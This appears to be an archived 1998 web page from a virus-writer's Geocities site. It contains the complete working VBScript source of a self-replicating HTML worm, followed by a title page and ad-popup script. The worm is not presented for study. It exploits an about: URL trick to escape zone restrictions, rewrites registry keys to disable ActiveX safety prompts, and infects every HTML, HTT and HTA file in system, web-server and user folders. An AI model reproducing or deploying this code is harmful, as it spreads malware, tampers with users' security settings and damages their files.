<html> <!--1nternal-->
<body>
<script language="VBScript"><!--
On Error Resume Next

if location.protocol <> "file:" then
	set wcover = window.open("about:%3cSCRIPT language=%22VBScript%22%3e%3c!--%0d%0aOn Error Resume Next%0d%0aset WSHShell = CreateObject(%22WScript.Shell%22)%0d%0aWSHShell.RegWrite %22HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\4\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\4\1201%22 , 0, %22REG_DWORD%22 %0d%0awindow.close%0d%0a--%3e%3c/SCRIPT%3e%01PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP%01file://C:")
	while wcover.closed = False
		DoNothing = "Nothing"
	wend
end if

Set WSHell = CreateObject("WScript.Shell")
WSHell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WSHell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
Set FSO = CreateObject("Scripting.FileSystemObject")
Set Rng = document.body.createTextRange()

Set Sfolder = fso.GetSpecialFolder(0)
InfectFolder(Sfolder.Path + "\Web")
InfectFolder("C:\Inetpub\wwwroot")
InfectFolder("C:\MyDocu~1")

if location.protocol = "file:" then
	HostPath = Replace(location.href, "file:///", "")
	HostPath = Replace(HostPath, "/", "\")
	HostPath = FSO.GetParentFolderName(HostPath)
	InfectFolder(HostPath)
end if

if Day(now) = 15 and (Int((5 * Rnd) + 1) = 1) then
	msgbox("HTML.Worm v0.3 /1nternal")
	location.href = "http://www.geocities.com/SiliconValley/Horizon/9386"
end if

Sub InfectFile(FilePath)
	Set f = FSO.OpenTextFile(FilePath, 1, True)
	FileContents = f.ReadAll
	f.close
	Set f = FSO.OpenTextFile(FilePath, 2, True)
	f.WriteLine "<html> <!--1nternal-->"
	f.WriteLine "<body>"
	f.WriteLine Rng.htmlText
	f.WriteLine "</body>"
	f.WriteLine "</html>"
	f.Write FileContents
	f.close
End Sub

Sub InfectFolder(FolderPath)
	if FSO.FolderExists(FolderPath) then
		Set folder = FSO.GetFolder(FolderPath)
		While folder.IsRootFolder = false 
			Set folder = fso.GetFolder(FolderPath)
			Set fc = folder.Files
			FolderPath = fso.GetParentFolderName(FolderPath)
			For each Target in fc
				InfType = Lcase(Fso.GetExtensionName(Target.name))
				if InfType = "html" or InfType = "htt" or InfType = "hta" or InfType = "htm" then
					TestString = ""
					Set fh = fso.opentextfile(Target.path, 1, true)
					if fh.AtEndOfStream <> True then
						TestString = fh.readline
					end if
					fh.close
					If TestString <> "<html> <!--1nternal-->" then
						Call InfectFile(Target.path)
					End IF
				End If
			Next
		Wend
	end if
End Sub

'HTML.Worm v0.3
'(c)1nternal 98
--></script>
</body>
</html>



<html>
<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<meta name="Author" content="1nternal">
<title>HTML.Worm v0.3</title>
</head>

<body>

<p align="center">&nbsp;</p>

<p align="center">&nbsp;</p>

<p align="center"><strong>HTML.Worm v0.3</strong></p>

<p align="center">/ 1nternal</p>

<p align="center"><a
href="http://www.geocities.com/SiliconValley/Horizon/9386">1nternal's
VX Site</a></p>

<p>&nbsp;</p>
</body>
</html>

<!-- <SERVICE NAME="pop"> -->
<SCRIPT LANGUAGE="javascript">
<!-- 
var cuid= "10197"; var keywords= "none"; 
// -->
</SCRIPT>
<SCRIPT LANGUAGE="javascript" SRC="http://adforce.imgis.com/?addyn|2.0|25|12998|1|1|key=none;misc=723457685;">
<!--
var urlOfNewPop= "http://www.geocities.com/ad_container/pop.html?cuid="+cuid+"&keywords="+keywords; oldPop= window.open(urlOfNewPop, '_popIt', 'width=515,height=125'); if (oldPop.location.href != urlOfNewPop) {  if ((navigator.appName == "Netscape") && (parseInt(navigator.appVersion) == 3)) { setTimeout("oldPop.close()", 750); setTimeout("window.open(urlOfNewPop, '_popIt', 'width=515,height=125')", 1700); } else { oldPop.close(); setTimeout("window.open(urlOfNewPop, '_popIt', 'width=515,height=125')", 1000); } } 
// -->
</SCRIPT>
<!-- </SERVICE> -->
